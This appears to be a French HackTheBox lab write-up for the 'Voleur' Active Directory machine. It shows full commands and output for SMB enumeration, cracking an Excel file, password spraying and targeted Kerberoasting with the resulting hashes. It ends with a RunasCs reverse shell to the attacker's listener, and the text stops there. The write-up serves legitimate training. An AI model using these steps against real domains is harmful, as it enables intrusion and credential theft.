---
title: Voleur
date: 2025-12-11 10:28:41
categories: ["Machines", "Hackthebox"]
tags: ["Medium", "Windows", "Active Directory", "DCSync", "Kerberoasting", "DPAPI"]
---

![Voleur](/images/Voleur/voleur.png)

`Voleur` est une machine Windows de difficulté moyenne conçue autour d'un scénario d'atteinte présumée, dans lequel l'attaquant dispose d'identifiants utilisateur à faibles privilèges. La machine inclut un environnement Active Directory et l'authentification `NTLM` est désactivée. Après la configuration de `Kerberos` et l'énumération réseau, on trouve un fichier Excel protégé par mot de passe sur un partage `SMB` exposé. Nous extrayons son hash de mot de passe, le cassons pour récupérer le mot de passe, et utilisons ce mot de passe pour accéder au tableur. L'énumération révèle un compte de service disposant des droits `WriteSPN`, ce qui permet une attaque ciblée de type Kerberoasting qui récupère des identifiants et donne un accès distant à l'hôte. Un utilisateur de domaine précédemment supprimé est restauré grâce aux privilèges de groupe, et un blob d'identifiants protégé par `DPAPI` est récupéré ; il est déchiffré avec le mot de passe de l'utilisateur pour révéler un compte à privilèges supérieurs. Ces identifiants conduisent à la découverte d'une clé privée `SSH` pour un compte de service de sauvegarde, permettant l'accès à un sous-système Linux sur un port non standard. À partir de là, les fichiers de sauvegarde `NTDS.dit`, `SYSTEM` et `SECURITY` sont extraits et utilisés pour récupérer le hash NT de l'`Administrator`, permettant finalement d'accéder en tant qu'`Administrator`.

# Énumération
## Nmap

Le scan révèle 20 ports ouverts.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ nmap 10.129.247.151 --min-rate 10000 -p- -vv
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-06 13:10 CEST
Initiating Ping Scan at 13:10
--SNIP--
Completed SYN Stealth Scan at 13:10, 19.97s ela[Voleur](#Récupérer%20la%20SAM%20et%20les%20LSA%20Secrets)psed (65535 total ports)
Nmap scan report for 10.129.247.151
Host is up, received echo-reply ttl 127 (0.075s latency).
Scanned at 2025-07-06 13:10:38 CEST for 20s
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2222/tcp  open  EtherNetIP-1     syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49670/tcp open  unknown          syn-ack ttl 127
49671/tcp open  unknown          syn-ack ttl 127
64012/tcp open  unknown          syn-ack ttl 127
64028/tcp open  unknown          syn-ack ttl 127

--SNIP--

╭─root at exegol-htb in /workspace/Voleur
╰─○ nmap 10.129.247.151 -sV -sC -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49667,49670,49671,64012,64028
Starting Nmap 7.93 ( https://nmap.org ) at 2025-07-06 13:11 CEST
Nmap scan report for 10.129.247.151
Host is up (0.057s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-06 19:12:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 42403930d6fc449537e19b880ba2d771 (RSA)
|   256 aed9c2b87d656f58c8f4ae4fe4e8cd94 (ECDSA)
|_  256 53ad6b6ccaae1b404471529529b1bbc1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
64012/tcp open  msrpc         Microsoft Windows RPC
64028/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time:
|   date: 2025-07-06T19:12:57
|_  start_date: N/A
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
|_clock-skew: 8h00m00s
```

J'ajoute le nom de domaine ainsi que le FQDN dans le fichier `/etc/hosts`.
```bash
echo "10.129.247.151 voleur.htb DC.voleur.htb DC" | tee -a /etc/hosts
```

## SMB - TCP 445

Avec l'erreur `STATUS_NOT_SUPPORTED`, je vois que l'authentification NTLM est désactivée.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ nxc smb 10.129.247.151 -u 'ryan.naylor' -p 'HollowOct31Nyt'
SMB         10.129.247.151  445    10.129.247.151   [*]  x64 (name:10.129.247.151) (domain:10.129.247.151) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.247.151  445    10.129.247.151   [-] 10.129.247.151\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED

╭─root at exegol-htb in /workspace/Voleur
╰─○ nxc smb 10.129.247.151 -u 'ryan.naylor' -p 'HollowOct31Nyt' --shares
SMB         10.129.247.151  445    10.129.247.151   [*]  x64 (name:10.129.247.151) (domain:10.129.247.151) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.247.151  445    10.129.247.151   [-] 10.129.247.151\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

Donc avec `getTGT` je forge un ticket Kerberos.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ faketime "$(date +'%Y-%m-%d') $(net time -S 10.129.247.151 | awk '{print $4}')" zsh

╭─root at exegol-htb in /workspace/Voleur
╰─○ getTGT.py voleur.htb/'ryan.naylor':'HollowOct31Nyt'
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in ryan.naylor.ccache
```

A l'aide du ticket forgé, je peux accéder aux partages via Kerberos à l'aide de `smbclient.py`. S'y trouve le partage `IT` dans lequel je télécharge le fichier `Access_Review.xlsx`.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ smbclient.py "voleur.htb"/"ryan.naylor":"HollowOct31Nyt"@"dc.voleur.htb" -k -no-pass
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 .
drw-rw-rw-          0  Mon Jun 30 23:08:33 2025 ..
drw-rw-rw-          0  Wed Jan 29 10:40:17 2025 First-Line Support
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 10:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 10:10:01 2025 ..
-rw-rw-rw-      16896  Fri May 30 00:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
# exit
```

Il s'agit d'un fichier Office protégé avec un mot de passe. Donc je peux craquer le mot de passe avec `office2john` et `john`. Je trouve alors le mot de passe `football1`.
```bash
╭─root at exegol-htb in /workspace/Voleur/smb
╰─○ file Access_Review.xlsx
Access_Review.xlsx: CDFV2 Encrypted

╭─root at exegol-htb in /workspace/Voleur/smb
╰─○ office2john.py Access_Review.xlsx > access.hash

╭─root at exegol-htb in /workspace/Voleur/smb
╰─○ john --wordlist=/usr/share/wordlists/rockyou.txt access.hash
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 SSE2 4x / SHA512 128/128 SSE2 2x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
football1        (Access_Review.xlsx)
1g 0:00:00:03 DONE (2025-07-08 13:49) 0.3289g/s 273.7p/s 273.7c/s 273.7C/s football1..legolas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Voici le contenu du fichier après l'avoir ouvert dans Excel. Je vois qu'il y a `Todd.Wolfe` qui a été supprimé.

| User             | Job Title                      | Permissions              | Notes                                                                 |
| ---------------- | ------------------------------ | ------------------------ | --------------------------------------------------------------------- |
| Ryan.Naylor      | First-Line Support Technician  | SMB                      | Has Kerberos Pre-Auth disabled temporarily to test legacy systems.    |
| Marie.Bryant     | First-Line Support Technician  | SMB                      |                                                                       |
| Lacey.Miller     | Second-Line Support Technician | Remote Management Users  |                                                                       |
| Todd.Wolfe       | Second-Line Support Technician | Remote Management Users  | Leaver. Password was reset to NightT1meP1dg3on14 and account deleted. |
| Jeremy.Combs     | Third-Line Support Technician  | Remote Management Users. | Has access to Software folder.                                        |
| Administrator    | Administrator                  | Domain Admin             | Not to be used for daily tasks!                                       |
|                  |                                |                          |                                                                       |
|                  |                                |                          |                                                                       |
| Service Accounts |                                |                          |                                                                       |
| svc_backup       |                                | Windows Backup           | Speak to Jeremy!                                                      |
| svc_ldap         |                                | LDAP Services            | P/W - M1XyC9pW7qT5Vn                                                  |
| svc_iis          |                                | IIS Administration       | P/W - N5pXyW1VqM7CZ8                                                  |
| svc_winrm        |                                | Remote Management        | Need to ask Lacey as she reset this recently.                         |
|                  |                                |                          |                                                                       |

## Password Spraying

Maintenant je fais du password spraying pour voir les combinaisons qui fonctionnent.
```bash
╭─root at exegol-htb in /workspace/Voleur/smb
╰─○ nxc smb dc.voleur.htb -u users.txt -p passwords.txt --continue-on-success -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_backup:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_ldap:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_iis:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\Ryan.Naylor:HollowOct31Nyt
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Marie.Bryant:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Lacey.Miller:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Todd.Wolfe:HollowOct31Nyt KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Jeremy.Combs:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:HollowOct31Nyt KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_backup:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_iis:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Marie.Bryant:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Lacey.Miller:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Todd.Wolfe:M1XyC9pW7qT5Vn KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Jeremy.Combs:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:M1XyC9pW7qT5Vn KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_backup:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Marie.Bryant:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Lacey.Miller:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Todd.Wolfe:N5pXyW1VqM7CZ8 KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Jeremy.Combs:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:N5pXyW1VqM7CZ8 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_backup:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_winrm:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Marie.Bryant:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Lacey.Miller:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Todd.Wolfe:NightT1meP1dg3on14 KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Jeremy.Combs:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:NightT1meP1dg3on14 KDC_ERR_PREAUTH_FAILED
```

# Shell en tant que svc_winrm
## Bloodhound

Avec l'option `--bloodhound` de `netexec`, j'obtiens un ensemble des relations entres les objets du domaine.
```bash
╭─root at exegol-htb in /workspace/Voleur/smb
╰─○ nxc ldap dc.voleur.htb -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' --bloodhound -c All -k --dns-server 10.129.243.246
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
LDAP        dc.voleur.htb   389    DC               Resolved collection methods: session, dcom, psremote, localadmin, group, acl, trusts, container, rdp, objectprops
LDAP        dc.voleur.htb   389    DC               Using kerberos auth without ccache, getting TGT
LDAP        dc.voleur.htb   389    DC               Done in 00M 15S
LDAP        dc.voleur.htb   389    DC               Compressing output into /root/.nxc/logs/DC_dc.voleur.htb_2025-07-08_220742_bloodhound.zip
```

`svc_ldap` membre du groupe `Restore_Users` a le droit `GenericWrite` sur `lacey.miller` qui est membre du groupe `Remote Management Users`. Il a aussi le droit `WriteSPN` sur `svc_winrm`.
Ces deux droits lui permettent de faire du `targeted Kerberoasting` sur ces deux comptes afin d'obtenir leur hash.
![](HTB/Machines/Voleur/Voleur-1.png)

## Targeted Kerberoast

Je génère un nouveau ticket pour `svc_ldap` que j'enregistre dans la variable `KRB5CCNAME`.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ getTGT.py voleur.htb/'svc_ldap':'M1XyC9pW7qT5Vn'

╭─root at exegol-htb in /workspace/Voleur
╰─○ export KRB5CCNAME=$(pwd)/svc_ldap.ccache

╭─root at exegol-htb in /workspace/Voleur
╰─○ klist
Ticket cache: FILE:/workspace/Voleur/svc_ldap.ccache
Default principal: svc_ldap@VOLEUR.HTB

Valid starting       Expires              Service principal
07/08/2025 23:07:54  07/09/2025 09:07:54  krbtgt/VOLEUR.HTB@VOLEUR.HTB
```

Ensuite j'utilise `targetedkerberoast.py` pour avoir les hash de `svc_winrm` et `lacey.miller`.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ targetedKerberoast.py -v -d "voleur.htb" -u "svc_ldap" -p "M1XyC9pW7qT5Vn" -o Kerberoastables.txt -k --dc-host dc.voleur.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (lacey.miller)
[+] Writing hash to file for (lacey.miller)
[VERBOSE] SPN removed successfully for (lacey.miller)
[VERBOSE] SPN added successfully for (svc_winrm)
[+] Writing hash to file for (svc_winrm)
[VERBOSE] SPN removed successfully for (svc_winrm)

╭─root at exegol-htb in /workspace/Voleur
╰─○ cat Kerberoastables.txt
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$d563be042682af784e174f0b1e51b4f7$c6646d11433d7cf768a457dffd9c7d8f8f278c4626921358cb602fdb458d050266450bc2becfa1d5c5c59a5545d52f7e185593df7a83a5281233cb5ecbd7af73bc00bfcbec2edd9a707bfdfc366857ea78b72444db05abff90f90954b94237d01723ce93c178eb36d46b6c7b4601dab4fb9f8ff64152698fbdc694e61ea1ad3b60e43da324f6d024a9da3936137b090e4d966a272a786cc3bae6a16d827801dc45d13e8bbf838062aa06da92853e29024a8a1ac10af7eec0329d65430cfeccf4d1fb4f3a505f616c3487263c9314e6f69e65f4f0ade718de7898defc3d6e7633df28464bc9f932f316d50bbfb10f7350661eb1207bec2f877b3c01b127d662aaf51ef6def7e39b326ea8a4e1e33c3534785c718b86b44597aa006c20de1aa14272fcda089369eeae224fb7b6a31e3094504e3580b5300cfbb82835a1b8a780193459495b2335e57d362097016a543778a26b2813758fa5e5c72e51a08f56edeb31d7d420f8f979e4b917dde659b15747c7652a16140599a202279700a67e03461721e5edbe01940bc02ffe47001234782dbc7d911912284e4a4f7e6ebb4240fadec4438675b7dfa9ddc32b3e7d6db14944dd6ef0b8bde72d8d5c72924791b1f1149cfb0aa25d214c0f299b17ba6ad734c976b036cdfaf83a6514a9dc673fa9b41ce96fdc97f4a0a84e064560293144134f84c6148798e5323e2582edbe49e3804d51cea35844e550c9656df114fa0e83f3d9450abe2a9856ec52991e6fbf1f837e06c371b868d755b5c46ae9799d1119198deb681da762e92b61b49898083962c64e89f0e47f88adeb4c16f97a40b7a774f019ab0c68dbb074483929f7cf6c842abdfd89ba72b2d2c313677cc670aa061ad8bf7721988aaf8c3a4a3f0453074554898c1000f06a22e80b02174c8714910cf465562ba01576a77dc2faf024af951cf536279180fd3bc7099cda28c1f0898bb17a655edb5f1cbc0728f473edf3aaa4aafbe1bca57f21aad9394c7a715b60beaa6c92671305ab1061bb38aef3814ffc50560dbed653e28f8d7fbc6f844bf8f04837a6a2b6752e10f9acf2204f789af2e6c382be530d0f877be1438a6df390348c044493edfae769ac3a0559d8e537c558079bfd16e869a8d870f3ad0a300c71664438ccbc8317249bbfce19c8e83bc587a6677a5bac17a832aa580c0b81f00a85c06a25ccb20ffc91b84c387f55705da9b1aea46e00d56b3a4831279fcea913592941b3cb5c3c64421b81c3999e5cd399b1750d91180f8d8be5bd25137385fc451d2bd980290a0885635f580dbbac274c323f41489fc50ca5ee3fb83e81ddbc0789ec952418c5febe91030ee50b43c89a1e1a460c7e1b07b2d3bb799f4baf2c712eeae17f8f3876177bd66fe0a1d10bb60ead15bd6ae7f05a74d3b35c43d4e89cf422eec1c4807fa3ba34fb9bb3676a480bd3b30d5e8c134720c8cfd0f2b96e2c22
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$407aadac9496612c33cbe58ba28526a1$19859b457f20176e66c414cd2227ae1fdc80a6c8e4a9c0b8acb08300f16353518a830667d48ad6bf592cbd69ebfecf453716d9156ae4e73738be009d2d0865edb5538d0d887e6b7fc4122c1b68cb454321e84d96c4523a542b5f4a85b213d2542d9aec78ea49dd81e1084178556f2cefe0e186780a3968789c179d66a896c87831ba9e301a1c16b8270f06db45bd4037f9da5aaee28a9be94ef74ac31246143148d9a72a916dd09ccea6490ce8bbdfd3ecd00d556fa38596ee9dfc9bf02765ee0c1f46beac480a13131e2703ec6404080a7550bf13bc953de6123cf57eaf7580ceb0f2c1dd8aea91b300a1f1189b16b3f05c9e6979e20c40effab81bac9293207b087144a39b099e015539efdf07010470c30e23c2958ac071cdd3502161fdd0da19468eb6a3783d85c4173012a70b759b772a4876fdb768babda68b125b69eaef1f7f82319d207b173e983012c7dc7e78b8eaffbed31de65da99cf6f639906e733a57676391dd3930c42e43f7a16a0c333a52d9cb6e906f886c984c5fba0f30a256ca5f31be5c262410bb8c08ffbfd32fc01eb8a6aed8a5d96110df7978ffaf9646cd341e413a1c31883025fe67ce9d3f397f3660701248483069603106f66ecd76f879dfdc7bbb900d5c6ee9c5552dd18c5dea47fc723d8ef01673a5dbd85ef0d71bb8d3d3d6d5167cc73260f914728c5c99344a079cb49282ee25cf41b2f48149bb92eb0e94601e33393074b17828f96ce453e2aa7e6de91ae449540057cf68277cbd29e82cd76c4e95fc8b6b7d7062718534fe4908fcddde917f50b2c7714d23736e72c6716029c498e68c78d93b96d431b954759dcaf4815b199acf6e4a8178e260c4b671ea88887756061623961d2ad81b517b030dbe644aad3b3bc387bb38a65db7a5975b8ee0a8f64cf0c5b22b02e8962817c700cf22b49bb5f366b10d70e14cd1463e30efd07980070918ed809a12e48237c7b3dc71ce293b2aab68a1cb8998562dd1c1fa65462aeb4eb81e44801e39e92023fa8a2333d360e381559cdbddc73cf0e1d1dc272cfcd8730c1d4e6b4e3503541ba84d742d94f2051efda87cdfc089504d28e1355a0840f0250291b05bbc39a80e4a24d84833d2259f2d6162caef1cf23b85c762a0621344f3a23a9f0966d605d216f9aa776f75f90b3f2275803d1faae7efcd3287e8cfe4e4a96e1687325e3e66afa4d99fa6c49573e3bad263bedbaddae0236002fe3fd153beaa999f83ffd488fafc1a431eb7f53b4cf5074410820f0f72e45caf2384cecdfd05ef03d906c40be22005e23c94a8f481b0132b6b1d0218c36987e2cde09ba5b6ba98e1c0b09ded08608781d98eec6a979ed6e341f6b00d1a95e61d8b890b76e1716847f05a156feb6331612aba8fe18612184b9505eb68e28fdc50f21d0133fcd59b8ccbb08f42751c4ec6510c23fe8bc2bb15babb880d4ecec0c199653017afc2d6d2
```

Je craque ensuite les hash avec `john`. Je ne trouve qu'un seul mot de passe.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ john --wordlist=`fzf-wordlists` Kerberoastables.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
AFireInsidedeOzarctica980219afi (?)
1g 0:00:00:05 DONE (2025-07-08 23:11) 0.1890g/s 2711Kp/s 4880Kc/s 4880KC/s !Sketchy!..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Il s'agit du mot de passe de `svc_winrm`.
```bash
╭─root at exegol-htb in /workspace/Voleur/smb
╰─○ nxc smb dc.voleur.htb -u users.txt -p 'AFireInsidedeOzarctica980219afi' -k --continue-on-success
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_backup:AFireInsidedeOzarctica980219afi KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_ldap:AFireInsidedeOzarctica980219afi KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\svc_iis:AFireInsidedeOzarctica980219afi KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Ryan.Naylor:AFireInsidedeOzarctica980219afi KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Marie.Bryant:AFireInsidedeOzarctica980219afi KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Lacey.Miller:AFireInsidedeOzarctica980219afi KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Todd.Wolfe:AFireInsidedeOzarctica980219afi KDC_ERR_C_PRINCIPAL_UNKNOWN
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Jeremy.Combs:AFireInsidedeOzarctica980219afi KDC_ERR_PREAUTH_FAILED
SMB         dc.voleur.htb   445    dc               [-] voleur.htb\Administrator:AFireInsidedeOzarctica980219afi KDC_ERR_PREAUTH_FAILED
```

## evil-winrm

Maintenant je veux obtenir un shell. Tout d'abord je change le contenu du fichier `/etc/krb5.conf` pour qu'il ait la configuration du domaine que je veux attaquer. Mais avant cela, je fais une sauvegarde du `/etc/krb5.conf` originel.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ cp /etc/krb5.conf /etc/krb5.conf~

╭─root at exegol-htb in /workspace/Voleur
╰─○ nxc smb dc.voleur.htb -d voleur.htb -u svc_winrm -p AFireInsidedeOzarctica980219afi -k --generate-krb5-file /etc/krb5.conf
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\svc_winrm:AFireInsidedeOzarctica980219afi

╭─root at exegol-htb in /workspace/Voleur
╰─○ cat /etc/krb5.conf

[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = VOLEUR.HTB

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
        default_domain = voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

Enfin je peux obtenir un shell avec `evil-winrm`.
```bash
╭─root at exegol-htb in /workspace/Voleur
╰─○ evil-winrm -i 'dc.voleur.htb' -r 'voleur.htb'

Evil-WinRM shell v3.7

Warning: User is not needed for Kerberos auth. Ticket will be used

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> dir


    Directory: C:\Users\svc_winrm\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   7:07 AM           2312 Microsoft Edge.lnk
-ar---          7/8/2025  12:49 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
7e4358c**************************
```


![](https://media1.tenor.com/m/vow5iqojst4AAAAC/oh-yeah.gif)

# Shell en tant que svc_ldap
## runascs.exe

Je vois que `svc_ldap` fait partie du groupe `Restore_Users`. Donc c'est avec lui que je pourrai restaurer `todd.wolfe`.
```bash
*Evil-WinRM* PS C:\> net user svc_ldap
User name                    svc_ldap
Full Name                    svc_ldap
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/29/2025 2:20:54 AM
Password expires             Never
Password changeable          1/30/2025 2:20:54 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/8/2025 2:50:24 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Restore_Users        *Domain Users
The command completed successfully.
```

J'uploade `RunaCs.exe` que j'utilise pour obtenir un shell en tant que `svc_ldap`.
```powershell
*Evil-WinRM* PS C:\Temp> ./RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.99:1337
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-d2d7e$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5704 created in background.
```

Et la j'obtiens un shell avec `netcat` en tant que `svc_ldap`.
```powershell
╭─root at exegol-htb in /workspace/Voleur
╰─○ rlwrap nc -lvnp 1337
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.129.193.196.
Ncat: Connection from 10.129.193.196:55915.
